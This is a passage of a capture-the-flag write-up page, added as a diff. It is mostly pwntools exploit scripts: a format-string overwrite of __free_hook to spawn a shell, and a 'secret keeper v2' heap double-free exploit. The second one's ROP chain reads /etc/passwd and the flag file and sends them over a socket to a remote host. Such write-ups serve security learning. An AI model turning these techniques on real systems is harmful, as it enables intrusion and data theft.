+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> __libc_start_main_ret <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__libc_start_main</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xF3</span>
+    
+    info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">stack </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> stack)
+    info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pie </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> pie)
+    info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">libc </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> libc<span style="color:#f92672">.</span>address)
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%16777215c</span><span style="color:#e6db74">%</span><span style="color:#e6db74">11$n</span><span style="color:#e6db74">&#39;</span>
+    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span>)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(stack <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, payload)
+
+    <span style="color:#75715e"># 0xc9cfa execve(&#34;/bin/sh&#34;, r12, r13)</span>
+    <span style="color:#75715e"># constraints:</span>
+    <span style="color:#75715e">#   [r12] == NULL || r12 == NULL</span>
+    <span style="color:#75715e">#   [r13] == NULL || r13 == NULL</span>
+
+    <span style="color:#75715e"># 0xc9cfd execve(&#34;/bin/sh&#34;, r12, rdx)</span>
+    <span style="color:#75715e"># constraints:</span>
+    <span style="color:#75715e">#   [r12] == NULL || r12 == NULL</span>
+    <span style="color:#75715e">#   [rdx] == NULL || rdx == NULL</span>
+
+    <span style="color:#75715e"># 0xc9d00 execve(&#34;/bin/sh&#34;, rsi, rdx)</span>
+    <span style="color:#75715e"># constraints:</span>
+    <span style="color:#75715e">#   [rsi] == NULL || rsi == NULL</span>
+    <span style="color:#75715e">#   [rdx] == NULL || rdx == NULL</span>
+
+    <span style="color:#75715e"># 0xe7e2b execve(&#34;/bin/sh&#34;, rsp+0x60, environ)</span>
+    <span style="color:#75715e"># constraints:</span>
+    <span style="color:#75715e">#   [rsp+0x60] == NULL</span>
+    one_gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe7e2b</span>
+    write64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__free_hook</span><span style="color:#e6db74">&#39;</span>], one_gadget)
+    r<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%65537c</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#39;</span>:
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        r <span style="color:#f92672">=</span> remote(HOST, PORT)
+        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">libc64_2.29.so</span><span style="color:#e6db74">&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+    <span style="color:#66d9ef">else</span>:
+        r <span style="color:#f92672">=</span> process(BINARY, aslr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/usr/lib/libc-2.30.so</span><span style="color:#e6db74">&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+
+    attach(r)
+    exploit()
+    r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="wheel-of-fortune">wheel of fortune</h2>
+<p><code>redacted</code></p>
+<h2 id="secret-keeper-v2">secret keeper v2</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sub_1447</span>() <span style="color:#75715e">// leak, stdout closed
+</span><span style="color:#75715e"></span>{
+  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">You asked for secret of </span><span style="color:#e6db74">&#34;</span>);
+  write(<span style="color:#ae81ff">1</span>, ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>secret, ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>secret_len);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Peeking at secrets is not good</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  fclose(stdout);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sub_149F</span>() <span style="color:#75715e">// double free?
+</span><span style="color:#75715e"></span>{
+  memset(ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>secret, <span style="color:#ae81ff">0</span>, ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>name_len);
+  free(ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>secret);
+  memset(ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>name, <span style="color:#ae81ff">0</span>, ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>secret_len);
+  free(ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>name);
+  memset(ptr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x18uLL</span>);
+  free(ptr);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sub_153F</span>() <span style="color:#75715e">// buffer overflow, stdin closed
+</span><span style="color:#75715e"></span>{
+  <span style="color:#66d9ef">char</span> dest[<span style="color:#ae81ff">0x2700</span>];
+
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Spilling secrets is not good</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  fclose(stdin);
+  memcpy(<span style="color:#f92672">&amp;</span>dest, ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>name, ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>secret_len);
+  memset(ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>secret, <span style="color:#ae81ff">0</span>, ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>name_len);
+  memset(ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>name, <span style="color:#ae81ff">0</span>, ptr<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>secret_len);
+}
+</code></pre></div><ul>
+<li>double free in <code>destroy some secret</code></li>
+<li>libc leak from unsortedbins</li>
+<li><code>stdout</code> closed right after getting leak</li>
+<li><code>stdin</code> closed right after buffer overflowed</li>
+<li>partial overwrite RBP, get RSP to our nopsled rop (4bit bruteforce)</li>
+<li>ROP getdents+orw with socket+connect to extract the flag</li>
+</ul>
+<p>I didn't solve this while CTF is still running since the remote server has really low success rate.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#75715e"># context.log_level = &#34;debug&#34; # debug, info, warn</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">splitw</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-h</span><span style="color:#e6db74">&#34;</span>]
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./secret_keeper_v2</span><span style="color:#e6db74">&#34;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">130.211.214.112</span><span style="color:#e6db74">&#34;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">18006</span>
+
+<span style="color:#75715e"># elf = ELF(BINARY, checksec=False)</span>
+uu64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: u64(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+uu32 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: u32(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+
+gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">brva 0x1677</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74"># brva 0x15da</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attach</span>(r):
+    <span style="color:#66d9ef">if</span> type(r) <span style="color:#f92672">==</span> process:
+        gdb<span style="color:#f92672">.</span>attach(r, gdbscript)
+
+<span style="color:#75715e"># 0x000000000003d780: pop rax; ret; </span>
+<span style="color:#75715e"># 0x00000000000268a2: pop rdi; ret;</span>
+<span style="color:#75715e"># 0x0000000000026dc9: pop rsi; ret; </span>
+<span style="color:#75715e"># 0x000000000002e1ba: pop rdx; ret; </span>
+<span style="color:#75715e"># 0x000000000011cb6e: mov qword ptr [rdi], rax; ret; </span>
+<span style="color:#75715e"># 0x00000000000b8ac9: syscall; ret; </span>
+<span style="color:#75715e"># 0x000000000003124f: nop; ret; </span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write64</span>(addr, n):
+    payload  <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000003d780</span>)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(n)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00000000000268a2</span>)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(addr)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000011cb6e</span>)
+    <span style="color:#66d9ef">return</span> payload
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_str</span>(addr, data):
+    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+    data_split <span style="color:#f92672">=</span> [data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data), <span style="color:#ae81ff">8</span>)]
+    <span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> data_split:
+        payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> write64(addr, uu64(d))
+        addr <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+    <span style="color:#66d9ef">return</span> payload
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">syscall</span>(rax<span style="color:#f92672">=</span>None, rdi<span style="color:#f92672">=</span>None, rsi<span style="color:#f92672">=</span>None, rdx<span style="color:#f92672">=</span>None):
+    <span style="color:#66d9ef">if</span> rax <span style="color:#f92672">!=</span> None:
+        payload  <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000003d780</span>)
+        payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(rax)
+    <span style="color:#66d9ef">if</span> rdi <span style="color:#f92672">!=</span> None:
+        payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00000000000268a2</span>)
+        payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(rdi)
+    <span style="color:#66d9ef">if</span> rsi <span style="color:#f92672">!=</span> None:
+        payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000026dc9</span>)
+        payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(rsi)
+    <span style="color:#66d9ef">if</span> rdx <span style="color:#f92672">!=</span> None:
+        payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002e1ba</span>)
+        payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(rdx)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00000000000b8ac9</span>)
+    <span style="color:#66d9ef">return</span> payload
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+    attach(r)
+
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Exit               </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1280</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">asdaasdasdasdsdasd</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">128</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">asdaasdasdasdsdasd</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+    <span style="color:#75715e"># double free</span>
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Exit               </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Exit               </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+
+    <span style="color:#75715e"># leak libc, heap</span>
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Exit               </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">of </span><span style="color:#e6db74">&#39;</span>)
+    res <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Peeking</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">1</span>)
+    leak <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0x270</span>:<span style="color:#ae81ff">0x278</span>]
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> uu64(leak) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1bcb00</span>
+    heap <span style="color:#f92672">=</span> uu64(res[<span style="color:#ae81ff">0x8</span>:<span style="color:#ae81ff">0x10</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>
+    
+    <span style="color:#66d9ef">if</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">return</span>
+    
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">libc </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> libc<span style="color:#f92672">.</span>address)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">heap </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> heap)
+
+    <span style="color:#75715e"># gdb.attach(r, &#39;b *{}&#39;.format(libc.address + 0x000000000003124f))</span>
+    
+    <span style="color:#75715e"># one shot rop</span>
+    r<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>send(str(<span style="color:#ae81ff">0x2702</span>))
+    
+    <span style="color:#75715e"># here lies home grown rop, heap here is just use for rw page</span>
+    rop1  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+    rop1 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> write_str(heap, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/etc/passwd</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    rop1 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> write_str(heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/home/ctf/</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># placeholder</span>
+    rop1 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> write_str(heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/home/ctf/flag.txt</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># placeholder</span>
+    rop1 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> write_str(heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">REDACTED</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># connect struct</span>
+
+    <span style="color:#75715e"># pwntools</span>
+    rop <span style="color:#f92672">=</span> ROP(libc)
+    <span style="color:#75715e"># first pass rop, getting user</span>
+    rop<span style="color:#f92672">.</span>open(heap, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#75715e"># /etc/passwd</span>
+    rop<span style="color:#f92672">.</span>socket(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>)
+    rop<span style="color:#f92672">.</span>connect(<span style="color:#ae81ff">1</span>, heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>, <span style="color:#ae81ff">16</span>)
+    rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0</span>, heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x1000</span>) <span style="color:#75715e"># /etc/passwd fd</span>
+    rop<span style="color:#f92672">.</span>write(<span style="color:#ae81ff">1</span>, heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x1000</span>) <span style="color:#75715e"># socketfd</span>
+    <span style="color:#75715e"># second pass rop, getting directory list</span>
+    <span style="color:#75715e"># rop.open(heap, 0, 0) # /home/user/</span>
+    <span style="color:#75715e"># rop.socket(2, 1, 0)</span>
+    <span style="color:#75715e"># rop.connect(1, heap + 20, 16)</span>
+    <span style="color:#75715e"># rop.getdents(0, heap + 0x1000, 0x1000) # dirfd</span>
+    <span style="color:#75715e"># rop.write(1, heap + 0x1000, 0x1000) # socketfd</span>
+    <span style="color:#75715e"># third pass rop, get the flag</span>
+    <span style="color:#75715e"># rop.open(heap, 0, 0) # /home/user/flag.txt</span>
+    <span style="color:#75715e"># rop.socket(2, 1, 0)</span>
+    <span style="color:#75715e"># rop.connect(1, heap + 0x40, 16)</span>
+    <span style="color:#75715e"># rop.read(0, heap + 0x1000, 0x1000) # flag fd</span>
+    <span style="color:#75715e"># rop.write(1, heap + 0x1000, 0x1000) # socketfd</span>
+
+    <span style="color:#75715e"># nopsled padding</span>
+    payload  <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000003124f</span>) <span style="color:#f92672">*</span> ((<span style="color:#ae81ff">0x2400</span><span style="color:#f92672">-</span>len(str(rop))<span style="color:#f92672">-</span>len(rop1))<span style="color:#f92672">/</span><span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>) <span style="color:#75715e"># nopsled</span>
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> str(rop1) <span style="color:#75715e"># call our home grown rop first</span>
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> str(rop) <span style="color:#75715e"># call socket+connect rop</span>
+
+    <span style="color:#75715e"># partial overwrite rbp, hope it&#39;ll hit</span>
+    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x2700</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p16(<span style="color:#ae81ff">0x4000</span>)
+    r<span style="color:#f92672">.</span>send(payload)
+
+    r<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">70</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">70</span>)
+
+    <span style="color:#75715e"># fire</span>
+    r<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+    <span style="color:#75715e"># wait for connection</span>
+    <span style="color:#75715e"># r.interactive()</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#39;</span>:
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./libc.so.6</span><span style="color:#e6db74">&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+    <span style="color:#66d9ef">while</span> True:
+        <span style="color:#66d9ef">try</span>:
+            r <span style="color:#f92672">=</span> remote(HOST, PORT)
+            <span style="color:#75715e"># r = process(BINARY, aslr=1)</span>
+        <span style="color:#66d9ef">except</span>:
+            <span style="color:#66d9ef">continue</span>
+        exploit()
+        r<span style="color:#f92672">.</span>close()
+        <span style="color:#75715e"># sleep(0.5)</span>
+</code></pre></div>
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/def-con-quals-2019-speedrun-12/"><i class="fa fa-chevron-circle-left"></i> DEF CON Quals 2019 - Speedrun 12</a>
+        </li>
+        
+        
+    </ul>
+</section>
+    
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright © 2019 - kiror0 |
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="http://zeroload.github.io/ctf/index.xml">Subscribe</a></h6>
+    </footer>
+</div>
+<script src="http://zeroload.github.io/ctf/js/scripts.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-146594173-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+</body>
+
+</html>
